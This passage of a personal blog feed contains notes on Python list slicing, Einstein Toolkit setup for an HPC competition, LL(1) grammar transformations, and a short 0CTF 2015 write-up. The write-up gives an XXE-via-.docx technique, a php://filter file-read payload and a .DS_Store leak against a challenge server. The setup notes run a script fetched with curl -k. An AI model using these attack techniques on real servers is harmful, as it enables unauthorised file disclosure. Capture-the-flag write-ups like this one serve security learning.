&lt;a href="https://docs.python.org/3.4/tutorial/datastructures.html"&gt;5. Data Structures — Python 3.4.3 documentation&lt;/a&gt;&lt;br /&gt;
發現裡頭有類似的東西，以前都沒仔細看。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;Add&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Equivalent&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;):]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  

&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;Extend&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;appending&lt;/span&gt; &lt;span class="nb"&gt;all&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;given&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Equivalent&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;):]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;雖然只有 append 的部分，但可以看出有點相似，&lt;br /&gt;
跟 Apua 經過一番討論後，整理了一下重點：  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;prepend  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等於  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;list.append  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;):]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等於  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等於  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;list.extend  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;):]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等於  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;prepend 和 append 的變化型都沒啥特別的，&lt;br /&gt;
用 insert 和 append 的可讀性其實比較高。&lt;br /&gt;
主要是 extend 的變化型有些有趣的東西可以討論。&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這會在 l 原本的的 i-1 和 i 中 insert a, b, c 這三個 elements，&lt;br /&gt;
可以看作是可 insert 任意位置的 list.extend，&lt;br /&gt;
原本的 extend 只能把 iter 展開後加到 l 的最後面，&lt;br /&gt;
但這樣的寫法突破了這種限制。&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;  
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然後也可以把 l[i:i] = [a, b, c] 的兩個 i 換成一般正常使用的 slicing 方式，&lt;br /&gt;
被 slicing 選擇出來的區段就會直接被 a, b, c 取代掉。&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;  
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;真的是第一次知道這種神奇的寫法...&lt;br /&gt;
Apua 猜測 list 的實作應該是跟 linked list 有關&lt;br /&gt;
之後有空的話來仔細看一下 python list 的實作好了  &lt;/p&gt;</summary><category term="Python"></category><category term="List"></category><category term="Slicing"></category><category term="Magic"></category></entry><entry><title>Note for TSCC 2015</title><link href="https://blog.m157q.tw/posts/2015/05/02/note-for-tscc-2015/" rel="alternate"></link><published>2015-08-27T16:39:17+08:00</published><updated>2015-08-27T16:39:17+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-05-02:posts/2015/05/02/note-for-tscc-2015/</id><summary type="html">&lt;h2&gt;System Preparation&lt;/h2&gt;
&lt;hr /&gt;
&lt;h2&gt;&lt;a href="http://www.netlib.org/benchmark/hpl/"&gt;HPL&lt;/a&gt;&lt;/h2&gt;
&lt;hr /&gt;
&lt;h3&gt;&lt;a href="http://lammps.sandia.gov/"&gt;LAMMPS&lt;/a&gt;&lt;/h3&gt;
&lt;hr /&gt;
&lt;h3&gt;&lt;a href="http://einsteintoolkit.org/"&gt;Einstein toolkit&lt;/a&gt;&lt;/h3&gt;
&lt;h4&gt;References&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/site/lincytw/cactus"&gt;https://sites.google.com/site/lincytw/cactus&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.einsteintoolkit.org/et-docs/Tutorial_for_New_Users"&gt;https://docs.einsteintoolkit.org/et-docs/Tutorial_for_New_Users&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://collapse2013.fudan.edu.cn/collapse/Talks/Loeffler.pdf"&gt;http://collapse2013.fudan.edu.cn/collapse/Talks/Loeffler.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.linuxjournal.com/content/numeric-relativity-einstein-toolkit"&gt;http://www.linuxjournal.com/content/numeric-relativity-einstein-toolkit&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Installation&lt;/h4&gt;
&lt;h5&gt;Get Herschel tarballs (released on Nov 19th, 2014)&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -kLO https://raw.githubusercontent.com/gridaphobe/CRL/ET_2014_11/GetComponents  

$ chmod a+x GetComponents  

$ ./GetComponents --parallel https://bitbucket.org/einsteintoolkit/manifest/raw/ET_2014_11/einsteintoolkit.th  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;May need to wait about 5 minutes (depend on the network speed)&lt;br /&gt;
After this, you should have a directory called "Cactus" contains tons of files.  &lt;/p&gt;
&lt;h5&gt;Compile&lt;/h5&gt;
&lt;p&gt;Configuration files can be found at &lt;code&gt;Cactus/simfactory/mdb/optionlists/*.cfg&lt;/code&gt;&lt;br /&gt;
The thornlist determine what to compile, can be found at &lt;code&gt;Cactus/thornlists/*.th&lt;/code&gt;.&lt;br /&gt;
Default will on ly have &lt;code&gt;einsteintoolkit.th&lt;/code&gt;&lt;br /&gt;
Find the proper config file and thornlist then copy them to the Cactus/  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; Cactus  
$ make &amp;lt;NAME&amp;gt;-config &lt;span class="nv"&gt;THORNLIST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;BSSN_Hydro.th &lt;span class="nv"&gt;options&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;c3.cfg  
&lt;span class="c1"&gt;## Then config. You need say &amp;quot;yes&amp;quot; if asked.  &lt;/span&gt;
$ make &amp;lt;NAME&amp;gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&amp;lt;NAME&gt; is the name of the setting user-defined variable.&lt;br /&gt;
You can have different settings with different names.&lt;br /&gt;
Here I use tscc.  &lt;/p&gt;
&lt;h5&gt;Debug&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;Add &lt;code&gt;#include &amp;lt;math.h&amp;gt;&lt;/code&gt; into &lt;code&gt;arrangements/EinsteinAnalysis/AHFinderDirect/src/jtutil/cpm_map.cc&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;多核心高效能程式調教&lt;/h3&gt;
&lt;h4&gt;keywords&lt;/h4&gt;
&lt;p&gt;OpenMP, MPI, CUDA, OpenCL  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CUDA  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://m157q.github.io/posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/"&gt;Nice Series of CUDA Tutorials on ptt.cc | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="TSCC"></category><category term="HPC"></category><category term="Competition"></category></entry><entry><title>Compiler Design Week 7</title><link href="https://blog.m157q.tw/posts/2015/04/07/compiler-design-week-7/" rel="alternate"></link><published>2015-04-07T15:40:11+08:00</published><updated>2015-04-07T15:40:11+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-04-07:posts/2015/04/07/compiler-design-week-7/</id><summary type="html">&lt;h3&gt;LL(1) - Top-Down parsing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;No ambiguous or left recursive grammar can be LL(1).&lt;ul&gt;
&lt;li&gt;ambiguous grammar 要先轉成 unambiguous grammar 才有辦法轉 LL(1)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Recursive decent parsing (Top-Down)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Left-most derivation for an input string&lt;ul&gt;
&lt;li&gt;LL&lt;/li&gt;
&lt;li&gt;LR&lt;ul&gt;
&lt;li&gt;現成的工具比較多&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Grammar substitution to revise non-LL(1) into LL(1) grammar&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Useless and un-reachable grammar handlings&lt;/li&gt;
&lt;li&gt;Eliminating Ambiguity&lt;/li&gt;
&lt;li&gt;Eliminating left-recursion&lt;/li&gt;
&lt;li&gt;Corner substitution&lt;/li&gt;
&lt;li&gt;Singleton substitution&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Useless and un-reachable grammar handlings&lt;/h2&gt;
&lt;h3&gt;Un-reachable&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;從 grammar rule 就可得知某個 id 不會被用到，也就是不會被用到&lt;/li&gt;
&lt;li&gt;Method&lt;ul&gt;
&lt;li&gt;Step 1: Start from root&lt;/li&gt;
&lt;li&gt;Step 2: Add reachable Rules&lt;/li&gt;
&lt;li&gt;Step 3: Until no more&lt;blockquote&gt;
&lt;p&gt;師：有點類似 java 裡面的 garbage collection。(mark-N-sweep)&lt;br /&gt;
謎：java 有 GC ?!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Useless&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;S -&amp;gt; a | b B
B -&amp;gt; b B
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;會被使用到，但是不會出現新東西，不會出現 leaf node，會一直 recursive 下去。&lt;blockquote&gt;
&lt;p&gt;師：看起來好像很有用，但其實是 useless  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Applying sequence&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Remove Un-reachable =&amp;gt; Remove useless =&amp;gt; Remove un-reachable =&amp;gt; OK&lt;/li&gt;
&lt;li&gt;Remove Useless =&amp;gt; Remove un-reachable =&amp;gt; OK&lt;blockquote&gt;
&lt;p&gt;師：如果忘記順序，不管順序，多做幾次，做到不會再變了，就是最佳化了。&lt;br /&gt;
問：why?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Eliminating Ambiguity: Ambiguous Grammar&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;E -&amp;gt; E + E
  -&amp;gt; E * E
  -&amp;gt; ID
  -&amp;gt; number
  -&amp;gt; (E)
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;師： 考試時看到 ambiguous grammar 就絕對不是 LL(1)  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Un-Ambiguos Grammar&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;E -&amp;gt; E + term
  -&amp;gt; term
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Left Associativity&lt;/h3&gt;
&lt;hr /&gt;
&lt;h2&gt;Eliminating left-recursion&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;師：top-down parsing 不喜歡 left recursion，一定要去除掉。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Left-Recursion Conversion&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;師：會造成 infinite loop  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;S -&amp;gt; Sα|β
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;S  -&amp;gt; βS&amp;#39;
S&amp;#39; -&amp;gt; αS&amp;#39;|ε
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;師：兩個的 selection set 會一樣&lt;br /&gt;
//selection set??&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;More General Cases&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;S -&amp;gt; Sα_{1} | Sα_{2} | ... | Sα_{n} | β_{1} | β_{2} | ... | β_{n}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to   &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;S  -&amp;gt; β_{1}S&amp;#39; | β_{2}S&amp;#39; | ... | β_{n}S&amp;#39;
S&amp;#39; -&amp;gt; α_{1}S&amp;#39; | α_{2}S&amp;#39; | ... | α_{n}S&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Left-Recursion Conversion&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;list -&amp;gt; operand | list operator operand
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to   &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;list&amp;#39; -&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;//待補  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Left-Recursion Grammar to Right-Recursion Grammar&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;E -&amp;gt; E + T | T
T -&amp;gt; T * F | F
F -&amp;gt; id | (E)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;E  -&amp;gt; TE&amp;#39;
E&amp;#39; -&amp;gt; +TE&amp;#39; | ε
T  -&amp;gt; FT&amp;#39;
T&amp;#39; -&amp;gt; *FT&amp;#39; | ε
F  -&amp;gt; id | (E)
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Course"></category><category term="Compiler"></category></entry><entry><title>0CTF 2015 Note</title><link href="https://blog.m157q.tw/posts/2015/03/30/0ctf-2015-note/" rel="alternate"></link><published>2015-03-30T18:15:23+08:00</published><updated>2015-03-30T18:15:23+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-30:posts/2015/03/30/0ctf-2015-note/</id><summary type="html">&lt;h1&gt;web / mislead&lt;/h1&gt;
&lt;p&gt;Padding Oralcle Attack in Cookie  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Padding_oracle_attack"&gt;https://en.wikipedia.org/wiki/Padding_oracle_attack&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mwielgoszewski/python-paddingoracle"&gt;https://github.com/mwielgoszewski/python-paddingoracle&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;web / golden mac 1&lt;/h1&gt;
&lt;p&gt;Download .DS_Store file from http://202.112.26.102/g0ldenM4c/.DS_Store.&lt;br /&gt;
It tells the flag is in http://202.112.26.102/g0ldenM4c/u_can_not_guess_this_haha.&lt;br /&gt;
Then, upload a .docx files which contains XXE to read the flag.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;php://filter/convert.base64-encode/resource=u_can_not_guess_this_haha.php  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing"&gt;https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://resources.infosecinstitute.com/xxe-attacks/"&gt;http://resources.infosecinstitute.com/xxe-attacks/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;web /forward&lt;/h1&gt;
&lt;p&gt;forward the MySQL connection to your MySQL Server and look at the network traffic.&lt;br /&gt;
u will see the flag leaked.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mysql_native_password  
forward  
SELECT flag FROM forward.flag  
def.forward.flag.flag.flag.flag....  
0ctf{w3ll_d0ne_guY}  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h1&gt;crypto / GREBeginner&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/5lipper/d6363e436f08f12f0bbb"&gt;https://gist.github.com/5lipper/d6363e436f08f12f0bbb&lt;/a&gt;  &lt;ul&gt;
